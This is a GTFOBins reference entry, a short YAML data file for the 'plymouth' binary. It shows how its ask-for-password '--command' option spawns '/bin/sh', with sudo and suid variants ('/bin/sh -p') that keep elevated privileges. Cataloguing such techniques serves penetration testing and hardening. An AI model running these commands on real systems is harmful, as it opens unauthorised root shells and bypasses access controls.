<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/plymouth -->
---
functions:
  shell:
  - code: |-
      plymouth ask-for-password --prompt=x --command=/bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          plymouth ask-for-password --prompt=x --command='/bin/sh -p'
        shell: false
      unprivileged:
...
